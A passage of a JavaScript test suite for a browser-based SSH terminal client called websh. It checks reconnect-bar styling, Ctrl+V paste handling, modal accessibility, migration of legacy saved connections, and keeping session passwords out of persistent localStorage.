  ok(!pwInput.classList.contains('h'), 'pw input revealed for manual+no-creds');
  ok(bar.querySelector('span').textContent.indexOf('type password') !== -1,
     'message hints at typing; got "' + bar.querySelector('span').textContent + '"');
  cleanup(env);
});

test('reconnect-bar: inline password input hidden for vault-backed pane', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-vrb', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.51'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p2';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  // Fake a vault-backed pane state.
  p.conn_id = 'X'.repeat(26);
  p.password = '';
  win.eval(`showReconnectBar(panes['${p.id}'], 'no_vault_key')`);
  const bar = p.el.querySelector('[data-reconnect]');
  const pwInput = bar.querySelector('input[type=password]');
  ok(pwInput.classList.contains('h'),
     'pw input hidden for vault-backed pane (no_vault_key reason)');
  ok(bar.querySelector('span').textContent.indexOf('Vault key missing') !== -1,
     'no_vault_key message shown');
  cleanup(env);
});

test('reconnect-bar: one alarm, not two - the card is quiet unless it must not be', async () => {
  // The pane badge already says "Disconnected"; the card used to repeat
  // the word AND paint a red edge, so a plain dropped link lit up the
  // pane twice in red. The word belongs to the badge, the colour to a
  // state the user has to act on.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-quiet', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.52'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p3';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  const bar = p.el.querySelector('[data-reconnect]');
  const msg = () => bar.querySelector('span').textContent;

  // Plain drop, creds still in memory: the button alone says it all.
  win.eval(`showReconnectBar(panes['${p.id}'], 'closed')`);
  ok(msg() === '', 'no text repeated from the badge; got "' + msg() + '"');
  ok(!bar.classList.contains('sev-err') && !bar.classList.contains('sev-warn'),
     'a dropped link is not painted as an error');
  // ...and with nothing but the button left, the card around it goes too.
  ok(bar.classList.contains('bare'), 'no card drawn around a lone button');

  // Plain drop with no creds: say what to do, still no alarm colour.
  p.password = '';
  win.eval(`showReconnectBar(panes['${p.id}'], 'closed')`);
  ok(/type the password/i.test(msg()), 'tells the user what to do; got "' + msg() + '"');
  ok(!bar.classList.contains('bare'), 'the card is back once it carries text');
  ok(!/disconnected/i.test(msg()), 'still no duplicated status word');
  ok(!bar.classList.contains('sev-err'), 'no error colour for a plain drop');

  // Credentials rejected: that IS an error.
  win.eval(`showReconnectBar(panes['${p.id}'], 'auth_failed')`);
  ok(bar.classList.contains('sev-err'), 'auth failure keeps the red edge');
  ok(!bar.classList.contains('bare'), 'and its card, to carry the edge');
  // ...and the class is dropped again when the reason is no longer one.
  win.eval(`showReconnectBar(panes['${p.id}'], 'closed')`);
  ok(!bar.classList.contains('sev-err'), 'severity cleared on the next show');
  win.eval(`showReconnectBar(panes['${p.id}'], 'no_vault_key')`);
  ok(bar.classList.contains('sev-warn') && !bar.classList.contains('sev-err'),
     'missing vault key is a warning, not an error');

  // The badge carries the state as a dot; it is no longer a red pill, and
  // the terminal's first row is held off the pane bar's edge.
  const css = html.replace(/\/\*[\s\S]*?\*\//g, '');
  ok(/\.pane-badge\.s-off::before\{background:var\(--dg\)\}/.test(css),
     'disconnected state shown by a dot');
  ok(/\.pane-badge\.s-on,\.pane-badge\.s-wait,\.pane-badge\.s-off\{background:none;padding:0;color:var\(--dim\)\}/.test(css),
     'badge text is dim, not a coloured pill');
  // The stack sits at the top centre of the terminal area. It was moved to
  // the bottom-right corner once (4b4f2c7) to keep it off the first line of
  // output; the owner found that worse - the button is where the eye goes
  // first at the top, and the first line under it is a fair price. Cards
  // stay sized to their content (centred, not stretched across the pane).
  const ov = (css.match(/\.pane-overlays\{([^}]*)\}/) || [, ''])[1];
  ok(/(^|;)align-items:center(;|$)/.test(ov),
     'overlay cards are centred and size to their content; rule: ' + ov);
  ok(/(^|;)top:0(px)?(;|$)/.test(ov),
     'the stack is anchored at the top of the terminal area; rule: ' + ov);
  ok(!/(^|;)bottom:/.test(ov),
     'the stack is not anchored to the bottom; rule: ' + ov);
  ok(/(^|;)left:0(px)?(;|$)/.test(ov) && /(^|;)right:0(px)?(;|$)/.test(ov),
     'the stack spans the pane width so its centre is the pane centre; rule: ' + ov);
  ok(!/class="reconnect-bar h"[^>]*>\s*<span[^>]*>Disconnected/.test(js),
     'the card carries no pre-baked status word to leak');
  // Every line websh writes into the terminal shares one form, so ours
  // are never mistaken for the remote's output - and a link that simply
  // dropped no longer shouts in bright red next to a red badge.
  const notices = js.match(/term\.write\('\\r\\n\\x1b\[[^']*'/g) || [];
  ok(notices.length >= 4, 'terminal notices found (' + notices.length + ')');
  ok(notices.every(n => /\[websh: /.test(n)),
     'all of them are [websh: ...]; got ' + JSON.stringify(notices));
  ok(!/\\x1b\[91m/.test(js), 'none of them is bright red');
  ok(/\\x1b\[2m\[websh: connection lost\]/.test(js),
     'a dropped link is a dim note, not an error');
  ok(/\\x1b\[31m\[websh: authentication failed\]/.test(js),
     'a rejected password still reads as an error');
  ok(/\.xterm\{padding:4px 6px 2px/.test(css),
     'top padding keeps the first row and its cursor off the pane bar');
  ok(/\.reconnect-bar\.bare\{background:none;border:none;box-shadow:none/.test(css),
     'the bare state drops every bit of card chrome');
  cleanup(env);
});

// ── Ctrl+V ──────────────────────────────────────────────────────────
test('Ctrl+V pastes by default, and only Ctrl+V', async () => {
  // In a terminal Ctrl+letter is a control code: xterm sends ^V and
  // cancels the browser's paste, so Ctrl+V looked broken (the shell sat
  // waiting for readline's quoted-insert). The fix is to DECLINE the
  // event - any handling at all ends in preventDefault, which kills the
  // native paste - so the test is about what the key handler returns.
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  ok(win.settings.ctrlVPaste === true, 'on by default');
  const k = (o) => Object.assign({type: 'keydown', ctrlKey: true, shiftKey: false,
                                  altKey: false, metaKey: false, code: 'KeyV', key: 'v'}, o);
  const paste = e => win._ctrlVShouldPaste(e);
  ok(paste(k({})), 'plain Ctrl+V pastes');
  ok(paste(k({code: '', key: 'V'})), 'and with CapsLock / no KeyboardEvent.code');
  ok(paste(k({code: 'KeyV', key: 'м'})), 'and on a non-Latin layout (physical V)');
  ok(!paste(k({type: 'keyup'})), 'only on keydown - one paste per press');
  ok(!paste(k({shiftKey: true})), 'Ctrl+Shift+V is left to the browser (it already pastes)');
  ok(!paste(k({altKey: true})), 'Ctrl+Alt+V / AltGr keeps its own meaning');
  ok(!paste(k({metaKey: true})), 'Meta chords untouched');
  ok(!paste(k({ctrlKey: false})), 'a bare v is typing, not pasting');
  ok(!paste(k({code: 'KeyC', key: 'c'})), 'Ctrl+C still interrupts');
  ok(!paste(k({code: 'KeyD', key: 'd'})), 'Ctrl+D still sends EOF');
  // Turning it off restores ^V for readline's quoted-insert and vim.
  win.settings.ctrlVPaste = false;
  ok(!paste(k({})), 'setting off → the key goes to the shell');
  win.settings.ctrlVPaste = true;
  cleanup(env);
});

test('Ctrl+V paste stays out of the way on macOS', async () => {
  // Cmd+V already pastes there, and ^V is the expected binding in every
  // Mac terminal.
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  Object.defineProperty(win.navigator, 'platform', {value: 'MacIntel', configurable: true});
  ok(win._isMacLike(), 'platform recognised');
  ok(!win._ctrlVShouldPaste({type: 'keydown', ctrlKey: true, code: 'KeyV', key: 'v'}),
     'Ctrl+V is left as ^V on a Mac');
  cleanup(env);
});

test('Ctrl+V paste has a switch in Options that takes effect at once', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.openOptions();
  const box = $(win, 'optCtrlVPaste');
  ok(box && box.checked === true, 'the box reflects the default');
  box.checked = false;
  box.dispatchEvent(new win.Event('change'));
  ok(win.settings.ctrlVPaste === false, 'unticking writes the setting');
  // No key handler is re-attached: the predicate reads the live value,
  // so every open pane follows immediately.
  ok(!win._ctrlVShouldPaste({type: 'keydown', ctrlKey: true, code: 'KeyV', key: 'v'}),
     'and the change applies with no reconnect or re-open');
  const stored = JSON.parse(win.localStorage.getItem(
    Object.keys(win.localStorage).find(key => /settings/.test(key))) || '{}');
  ok(stored.ctrlVPaste === false, 'and it survives a reload');
  win.resetOptions();
  ok(win.settings.ctrlVPaste === true, '"Reset to defaults" brings it back');
  cleanup(env);
});

test('a dead session shows no cursor', async () => {
  // Nothing accepts keystrokes once the session is gone, and on a pane
  // whose output starts at the top the blinking cursor sat right under
  // the pane bar, looking welded to the pane name.
  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
  const p = await _onePane(win);
  let blurred = 0, focused = 0;
  p.term.blur = () => blurred++;
  p.term.focus = () => focused++;
  win.endSession(p, {});
  ok(blurred === 1, 'the terminal is blurred when the session ends');
  // ...and a reconnect takes the focus back.
  win.beginSessionIO(p);
  ok(focused === 1, 'focus returns when a session starts again');
  cleanup(env);
});

test('reconnect-bar: Enter / Reconnect with typed password feeds connectPane', async () => {
  // The inline-input recovery uses the typed value as opts.password and
  // dispatches the body with it. We assert the body that lands at the
  // server carries the freshly-typed password.
  let lastConnectBody = null;
  let connectCount = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    // First connect goes through with the initial password.
    {action: 'connect', match: b => (b.password === 'p3-original'),
     response: {session_id: 'sid-rb3', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    // Catch-all for the typed-password reconnect attempt.
    {action: 'connect', response: (b) => {
      lastConnectBody = b; connectCount++;
      return {session_id: 'sid-rb3-retry', alive: true};
    }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.0.0.52'; $(win, 'iU').value = 'a';
  $(win, 'iPw').value = 'p3-original';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  ok(p && p.sid === 'sid-rb3', 'initial connect landed');
  // Clear in-memory creds, raise the bar.
  p.password = '';
  win.eval(`showReconnectBar(panes['${p.id}'], 'auth_failed')`);
  // Type the new password into the inline input.
  const pwInput = p.el.querySelector('input[type=password][data-reconnect-pw]');
  pwInput.value = 'p3-typed';
  // Trigger reconnect via the Reconnect button (clickBtn-style eval
  // since runScripts:outside-only).
  win.eval(`reconnectPane('${p.id}')`);
  await sleep(80);
  ok(lastConnectBody && lastConnectBody.password === 'p3-typed',
     'typed password reached /api/connect body; got ' + (lastConnectBody && lastConnectBody.password));
  cleanup(env);
});

test('legacy auto-drop: modal carries dialog a11y + Got-it dismisses', async () => {
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const modal = $(win, 'legacyUpdateModal');
  ok(modal.getAttribute('role') === 'dialog', 'role=dialog');
  ok(modal.getAttribute('aria-modal') === 'true', 'aria-modal=true');
  ok(modal.getAttribute('aria-labelledby') === 'legacyUpdateTitle',
     'aria-labelledby points at title');
  ok($(win, 'legacyUpdateTitle').tagName === 'H2',
     'title h2 present with matching id');
  // Drive open + close from JS.
  win.eval('openLegacyUpdateModal()');
  ok(!hidden(modal), 'modal opens');
  // Got-it click closes (runScripts:outside-only — eval the onclick).
  clickBtn(win, 'legacyUpdateOk');
  await sleep(10);
  ok(hidden(modal), 'modal hidden after Got it');
  cleanup(env);
});

// =====================================================================
// Vault: legacy-migration cluster regressions (PR-67 follow-up review)
// =====================================================================

test('legacy auto-drop: skipped when vault_enabled=false (no silent data loss)', async () => {
  // On a vault-off deployment (cryptography missing, schema downgrade,
  // WEBSH_VAULT_ENABLE unset) legacy plaintext rows are the only
  // working storage path. Stripping them would orphan the user — Save
  // UI is hidden by .vault-only CSS so they can't re-save, and every
  // saved-card click would open an empty-password form. _maybeAutoDrop
  // must be gated on serverConfig.vault_enabled.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: false}}];
  const env = await mkEnv(plan); const win = env.win;
  // Seed a legacy row carrying plaintext, then re-run loadServerConfig
  // (the boot one already ran in mkEnv without legacy rows).
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OldProd', host: 'p', port: 22, user: 'u', pass: 'oldpw',
     auth: 'pw', persistent: true}]));
  // Re-run the auto-drop gating path explicitly. With vault_enabled=false
  // _maybeAutoDropLegacy must NOT be called by the load flow.
  win.eval('loadServerConfig()');
  await sleep(40);
  ok(hidden($(win, 'legacyUpdateModal')),
     'legacy modal NOT opened on vault-off deployment');
  const list = JSON.parse(win.localStorage.getItem('websh_connections'));
  ok(list.length === 1 && list[0].pass === 'oldpw',
     'legacy plaintext row STILL has pass on vault-off deployment');
  cleanup(env);
});

test('legacy fallback: host:port lookup routes through prompt under restrict_hosts', async () => {
  // Pre-naming legacy row (no c.connection) on a restrict_hosts
  // deployment with a prompt connection matching its host:port. The
  // fallback must route through selectPromptConnection — otherwise the
  // manual form stays hidden and the user can't identify or use the row.
  let connectCalls = 0;
  const plan = [
    {action: 'config', response: {restrict_hosts: true, vault_enabled: true,
      connections: [{name: 'hh', host: 'h.example.com', port: 22,
                     username: '', kind: 'prompt'}]}},
    {action: 'connect', response: () => { connectCalls++; return {auth_failed: true}; }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Legacy row with no c.connection (pre-naming) but host:port match.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'LegacyNoName', host: 'h.example.com', port: 22, user: 'deploy',
     auth: 'pw', persistent: true}]));
  win.eval('renderSaved()');
  win.document.querySelector('#savedList .sv').click();
  await sleep(40);
  ok(connectCalls === 0, 'no /api/connect with empty creds');
  // selectPromptConnection locks host and shows the promptTarget banner;
  // those are the observable effects we pin on.
  ok($(win, 'iH').disabled === true,
     'host locked by prompt routing (host:port fallback worked)');
  ok(!hidden($(win, 'promptTarget')),
     'prompt-target banner shown after host:port routing');
  ok($(win, 'iU').value === 'deploy',
     'user pre-filled from saved row');
  cleanup(env);
});

test('legacy fallback: clears stale selectedPrompt when no prompt match', async () => {
  // User opens the form, selects a prompt connection (locking it via
  // selectedPrompt), then WITHOUT submitting clicks a legacy manual
  // saved card whose host:port doesn't match any prompt. Without
  // clearPromptSelection, doConnect would still ship connection:
  // selectedPrompt.name and route to the wrong host.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, vault_enabled: true,
      connections: [{name: 'hh', host: 'h.example.com', port: 22,
                     username: '', kind: 'prompt'}]}}];
  const env = await mkEnv(plan); const win = env.win;
  // Pre-select the prompt connection (form is open).
  win.eval('selectPromptConnection("hh")');
  ok(win.selectedPrompt && win.selectedPrompt.name === 'hh',
     'selectedPrompt set to hh');
  // Legacy row with NO host:port match against any prompt.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OtherBox', host: 'other.example.com', port: 22, user: 'admin',
     auth: 'pw', persistent: true}]));
  win.eval('renderSaved()');
  win.document.querySelector('#savedList .sv').click();
  await sleep(40);
  ok(win.selectedPrompt === null,
     'selectedPrompt cleared by legacy fallback (no host:port match)');
  // Host now reflects the saved row, not the prompt's host.
  ok($(win, 'iH').value === 'other.example.com',
     'host filled from legacy row, not stale prompt target');
  ok($(win, 'iH').disabled === false,
     'host input unlocked (prompt selection cleared)');
  cleanup(env);
});

test('legacy modal: autoconnect deferred until Got-it (no focus theft / no overlap)', async () => {
  // Legacy rows present → _maybeAutoDropLegacy opens its modal during
  // loadServerConfig. Without the deferral, doAutoConnect would call
  // showOverlay() in the same tick and the connect overlay would paint
  // on top (later in DOM), stealing focus to iPw. The fix queues
  // doAutoConnect inside closeLegacyUpdateModal.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  // Seed legacy row + re-trigger the load flow so _maybeAutoDropLegacy
  // fires after the mkEnv-time empty boot. mkEnv's boot already showed
  // the connect overlay (no panes, no legacy rows) — hide it so the
  // assertion below tests the actual deferral path, not stale state.
  $(win, 'ov').classList.add('h');
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OldProd', host: 'p', port: 22, user: 'u', pass: 'oldpw',
     auth: 'pw', persistent: true}]));
  win.eval('loadServerConfig()');
  await sleep(40);
  // Legacy modal is up; connect overlay deferred.
  ok(!hidden($(win, 'legacyUpdateModal')), 'legacy modal opened');
  ok(hidden($(win, 'ov')),
     'connect overlay NOT shown while legacy modal is up');
  ok(typeof win._deferredAfterLegacyModal === 'function',
     'doAutoConnect queued for after modal close');
  // Focus is on the Got-it button, not iPw.
  ok(win.document.activeElement === $(win, 'legacyUpdateOk'),
     'focus on Got-it button, not stolen by connect overlay');
  // Dismiss → connect overlay drains.
  clickBtn(win, 'legacyUpdateOk');
  await sleep(20);
  ok(hidden($(win, 'legacyUpdateModal')), 'legacy modal closed');
  ok(!hidden($(win, 'ov')),
     'connect overlay shown after legacy modal dismissed');
  ok(win._deferredAfterLegacyModal === null,
     'deferred callback drained');
  cleanup(env);
});

test('restrict_hosts single prompt: host pre-filled even when a saved card exists', async () => {
  // Single-target kiosk (restrict_hosts + exactly one prompt connection): the
  // host is the only allowed target, so doAutoConnect must pre-lock it via
  // selectPromptConnection on load even when localStorage already holds a
  // saved card. The old `loadSaved().length === 0` guard suppressed the
  // pre-fill once any card was saved, stranding the user on an empty host
  // field. Regression for a single fixed-target restrict_hosts setup.
  const plan = [{action: 'config', response: {restrict_hosts: true, vault_enabled: false,
    connections: [{name: 'hh', host: 'h.example.com', port: 22,
                   username: '', kind: 'prompt'}]}}];
  const env = await mkEnv(plan); const win = env.win;
  // mkEnv booted with empty localStorage, so the initial doAutoConnect
  // already pre-filled iH. Reset the form so the assertion reflects the
  // re-trigger below (with a saved card present), not the empty-boot fill.
  win.selectedPrompt = null;
  $(win, 'iH').value = ''; $(win, 'iH').disabled = false;
  // A saved card present — this used to suppress the host pre-fill.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'HH', host: 'h.example.com', port: 22, user: 'sber',
     connection: 'hh', auth: 'pw', persistent: true}]));
  win.loadServerConfig();
  await sleep(40);
  ok($(win, 'iH').value === 'h.example.com',
     'host pre-filled to the single prompt target despite a saved card');
  ok($(win, 'iH').disabled === true, 'host input locked');
  ok(win.selectedPrompt && win.selectedPrompt.name === 'hh',
     'prompt connection auto-selected on load despite saved card');
  cleanup(env);
});

test('legacy fallback: key-auth row matching prompt opens on KEY tab', async () => {
  // Legacy auth:'key' row whose host:port matches a prompt connection.
  // The routing path calls selectPromptConnection which unconditionally
  // sets the pw tab. After the fix, setAuthTab(useKey ? 'key' : 'pw')
  // runs AFTER routing so the key tab wins. Otherwise the user would
  // see a hidden iKey textarea and type a password into iPw.
  const plan = [
    {action: 'config', response: {restrict_hosts: true, vault_enabled: true,
      connections: [{name: 'hh', host: 'h.example.com', port: 22,
                     username: '', kind: 'prompt'}]}}];
  const env = await mkEnv(plan); const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'HHKey', host: 'h.example.com', port: 22, user: 'deploy',
     connection: 'hh', auth: 'key', persistent: true}]));
  win.eval('renderSaved()');
  win.document.querySelector('#savedList .sv').click();
  await sleep(40);
  // Auth mode flipped to key AFTER prompt routing.
  ok(win.authMode === 'key',
     'authMode is key after routing (got: ' + win.authMode + ')');
  // iKey form-group visible, iPw form-group hidden.
  ok(!$(win, 'authKey').classList.contains('h'),
     'key form-group visible');
  ok($(win, 'authPw').classList.contains('h'),
     'pw form-group hidden');
  // Prompt routing still happened: host locked, banner shown.
  ok($(win, 'iH').disabled === true,
     'host locked by prompt routing');
  ok(!hidden($(win, 'promptTarget')), 'prompt-target banner shown');
  cleanup(env);
});

test('legacyUpdateModal: Esc closes + Tab traps + restore focus', async () => {
  // a11y parity with signOutModal: keydown Escape dismisses, Tab is
  // trapped to the focusables inside the dialog, focus is restored to
  // the element that was active before opening.
  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [],
                                                vault_enabled: true}}];
  const env = await mkEnv(plan); const win = env.win;
  const modal = $(win, 'legacyUpdateModal');
  // Pre-focus on an element OUTSIDE the modal so we can verify restore.
  // iH is a focusable text input present in the connect form.
  $(win, 'iH').focus();
  ok(win.document.activeElement === $(win, 'iH'),
     'baseline focus on iH before opening modal');
  win.eval('openLegacyUpdateModal()');
  await sleep(10);
  ok(!hidden(modal), 'modal open');
  ok(win.document.activeElement === $(win, 'legacyUpdateOk'),
     'focus moved to Got-it button');
  // Esc closes.
  const evt = new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true,
                                                 cancelable: true});
  win.document.dispatchEvent(evt);
  await sleep(10);
  ok(hidden(modal), 'Esc keydown closes the modal');
  ok(win.document.activeElement === $(win, 'iH'),
     'focus restored to the element that opened the modal');
  // Tab trap: open again, send Tab — only one focusable, so Tab from
  // the (sole) Got-it button cycles back to itself, not out to the page.
  $(win, 'iH').focus();
  win.eval('openLegacyUpdateModal()');
  await sleep(10);
  ok(win.document.activeElement === $(win, 'legacyUpdateOk'),
     'focus on Got-it before Tab');
  const tabEvt = new win.KeyboardEvent('keydown', {key: 'Tab', bubbles: true,
                                                    cancelable: true});
  win.document.dispatchEvent(tabEvt);
  // Tab from the only focusable wraps back to the first (= same button).
  ok(win.document.activeElement === $(win, 'legacyUpdateOk'),
     'Tab trapped inside modal');
  // Cleanup — close so we don't leak the keydown listener.
  win.eval('closeLegacyUpdateModal()');
  cleanup(env);
});

test('terminate-confirm and file-browser dialogs: Esc closes via shared trap', async () => {
  // makeModalTrap parity: the previously untrapped dialogs (confirmOv,
  // fbOv) now get Escape-to-dismiss, initial focus, and focus restore.
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's-trap', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'ls', response: {path: '/home/u', entries: []}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  ok(!!p, 'pane up');
  // confirmOv: Escape cancels (does NOT terminate).
  let confirmed = 0;
  win.showTerminateModal(p, () => { confirmed++; });
  await sleep(10);
  ok(!hidden($(win, 'confirmOv')), 'terminate confirm open');
  ok(win.document.activeElement ===
       $(win, 'confirmOv').querySelector('button'),
     'initial focus on Cancel (safe default)');
  win.document.dispatchEvent(new win.KeyboardEvent('keydown',
    {key: 'Escape', bubbles: true, cancelable: true}));
  await sleep(10);
  ok(hidden($(win, 'confirmOv')), 'Esc closes the terminate confirm');
  ok(confirmed === 0, 'Esc cancels — terminate callback NOT fired');
  // fbOv: Escape closes the file browser.
  win.showFileBrowser(p.id);
  await sleep(30);
  ok(!hidden($(win, 'fbOv')), 'file browser open');
  win.document.dispatchEvent(new win.KeyboardEvent('keydown',
    {key: 'Escape', bubbles: true, cancelable: true}));
  await sleep(10);
  ok(hidden($(win, 'fbOv')), 'Esc closes the file browser');
  cleanup(env);
});

test('form_defaults from /api/config prefill the manual form', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
      form_defaults: {host: '192.0.2.10', port: 2222, username: 'deploy'}}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  ok($(win, 'iH').value === '192.0.2.10',
     'host prefilled; got ' + $(win, 'iH').value);
  ok(String($(win, 'iP').value) === '2222',
     'port prefilled over the markup default; got ' + $(win, 'iP').value);
  ok($(win, 'iU').value === 'deploy',
     'username prefilled; got ' + $(win, 'iU').value);
  cleanup(env);
});

test('form_defaults never overwrite user-typed values or apply under restrict_hosts', async () => {
  // applyFormDefaults runs when /api/config lands; anything the user
  // already typed must win, and under restrict_hosts with configured
  // connections the section is ignored outright.
  const plan = [
    {action: 'config', response: {restrict_hosts: true,
      connections: [{name: 'only', kind: 'ready', host: 'h', port: 22,
                     username: 'u', persistent: false}],
      form_defaults: {host: 'ignored.example', username: 'ignored'}}},
    // restrict_hosts+single ready connection auto-connects on boot:
    {action: 'connect', response: {auth_failed: true, alive: false}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  ok($(win, 'iH').value !== 'ignored.example',
     'restrict_hosts: defaults ignored; got ' + $(win, 'iH').value);
  cleanup(env);

  // Pre-typed value wins over the default.
  const env2 = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: [],
      form_defaults: {host: 'default.example'}}},
  ]);
  // Simulate the user-typed case by calling applyFormDefaults again on
  // a filled form — it must not overwrite.
  const win2 = env2.win;
  $(win2, 'iH').value = 'typed.example';
  win2.applyFormDefaults({restrict_hosts: false, connections: [],
                          form_defaults: {host: 'default.example'}});
  ok($(win2, 'iH').value === 'typed.example',
     'user-typed host not overwritten; got ' + $(win2, 'iH').value);
  cleanup(env2);
});

test('proto mismatch surfaces a reload toast; absent/equal stay silent', async () => {
  // Server upgraded across a breaking wire change while the tab stayed
  // open -> /api/config carries a different proto -> warn toast. An
  // older server (no proto field) or a matching one must stay silent.
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   proto: 999}},
  ]);
  const win = env.win;
  await sleep(30);
  const toasts = win.document.querySelectorAll('.toast');
  let found = false;
  toasts.forEach(t => { if (/reload the page/i.test(t.textContent)) found = true; });
  ok(found, 'mismatch toast shown; got ' + toasts.length + ' toasts');
  cleanup(env);

  const env2 = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
  ]);
  await sleep(30);
  let silent = true;
  env2.win.document.querySelectorAll('.toast').forEach(t => {
    if (/reload the page/i.test(t.textContent)) silent = false;
  });
  ok(silent, 'no toast when the server does not send proto');
  cleanup(env2);

  const env3 = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                   proto: 1}},  // == CLIENT_PROTO today
  ]);
  await sleep(30);
  let silent3 = true;
  env3.win.document.querySelectorAll('.toast').forEach(t => {
    if (/reload the page/i.test(t.textContent)) silent3 = false;
  });
  ok(silent3, 'no toast when proto matches');
  cleanup(env3);
});

test('applyTheme repaints live panes and sets CSS vars; unknown falls back', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 's-theme', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(80);
  const p = paneList(win)[0];
  ok(!!p, 'pane up');
  // The default fake Terminal has no options bag; applyTheme writes
  // options.theme only when the bag exists (real xterm always has it).
  if (!p.term.options) p.term.options = {};
  win.applyTheme('dark');
  ok(p.term.options.theme && p.term.options.theme.background === '#0d1117',
     'live pane repainted from the THEMES table');
  ok(win.document.documentElement.style.getPropertyValue('--bg') === '#0d1117',
     'CSS var set from the table');
  win.applyTheme('no-such-theme');
  ok(p.term.options.theme.background === '#0d1117',
     'unknown theme falls back to dark');
  cleanup(env);
});


test('font css link tracks the active family; system font removes it', async () => {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
  ]);
  const win = env.win;
  await sleep(30);
  const link = win.document.getElementById('dynFontCss');
  ok(!!link, 'boot created the dynamic font link');
  ok(/JetBrains\+Mono/.test(link.getAttribute('href')),
     'default family loaded; got ' + link.getAttribute('href'));
  ok(!/Fira\+Code/.test(link.getAttribute('href')),
     'inactive families NOT loaded');
  win.ensureFontLink('fira-code');
  ok(/Fira\+Code:wght@300;400;500;700/.test(
       win.document.getElementById('dynFontCss').getAttribute('href')),
     'family switch swaps the href with per-family weights');
  win.ensureFontLink('system');
  ok(!win.document.getElementById('dynFontCss'),
     'system font removes the link entirely');
  cleanup(env);
});

// =====================================================================
// Vault: manual-pane plaintext lives in sessionStorage
// =====================================================================

test('manual pane: plaintext stored in sessionStorage, NOT in localStorage manifest', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-mp1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'manual.example.com';
  $(win, 'iU').value = 'alice';
  $(win, 'iPw').value = 'verysecret';
  $(win, 'iPersistent').checked = false;
  // No iSave — pure manual mode, no vault entry.
  win.doConnect();
  await sleep(120);
  // The pane manifest must NOT contain the plaintext password.
  win.eval('saveSessions()');
  const manifest = JSON.parse(win.localStorage.getItem('websh_panes'));
  const rec = Object.values(manifest.panes)[0];
  ok(rec.via === 'manual', 'manual via tag; got via=' + rec.via);
  ok(!('password' in rec) && !('key' in rec) && !('key_pass' in rec),
     'no plaintext credential fields in localStorage manifest');
  // sessionStorage should hold them, keyed by the live pane id.
  const ss = JSON.parse(win.sessionStorage.getItem('websh_panes_session') || '{}');
  const ids = Object.keys(ss);
  ok(ids.length === 1, 'one entry in sessionStorage; got ' + ids.length);
  ok(ss[ids[0]].password === 'verysecret',
